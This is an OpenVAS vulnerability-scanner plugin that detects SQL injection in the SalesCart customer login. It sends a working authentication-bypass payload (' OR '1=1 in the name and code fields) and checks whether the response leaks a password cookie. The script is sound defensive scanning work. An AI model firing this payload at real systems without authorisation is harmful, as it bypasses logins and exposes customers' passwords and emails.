###############################################################################
# OpenVAS Vulnerability Test
# $Id: SalesCart_login_multiple_sql_injection.nasl 5770 2017-03-29 14:34:03Z cfi $
#
# SalesCart Login Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100053");
 script_version("$Revision: 5770 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-29 16:34:03 +0200 (Wed, 29 Mar 2017) $");
 script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
 script_bugtraq_id(33534);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("SalesCart Login Multiple SQL Injection Vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : "SalesCart is prone to multiple SQL-injection vulnerabilities because
 it fails to sufficiently sanitize user-supplied data before using it in a SQL query.");
 script_tag(name : "impact" , value : "Exploiting this issue could allow an attacker to compromise the
 application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/33534");

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_asp(port:port))exit(0);

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/online/customer/customer_login.asp");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if( buf == NULL )continue;

  if( egrep(pattern: ".*Customer Control Panel.*", string: buf) ||
      egrep(pattern: ".*Order Management System, Ver [0-9}+\.[0-9]*.*", string: buf) ) {

    variables = string("name=%27+OR+%271%3D1&code=%27+OR+%271%3D1&Login=Login&Remember=ON");
    url = string(dir + "/online/customer/cmenu.asp");
    host = http_host_name( port:port );

    req = string(
      "POST ", url, " HTTP/1.0\r\n", 
      "Referer: ","http://", host, url, "\r\n",
      "Host: ", host, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables );

    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if( res == NULL )continue;

    if( egrep(pattern: "^Set-Cookie: SalesCart.*rememberme=ON&password=.*&email=.*", string: res) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );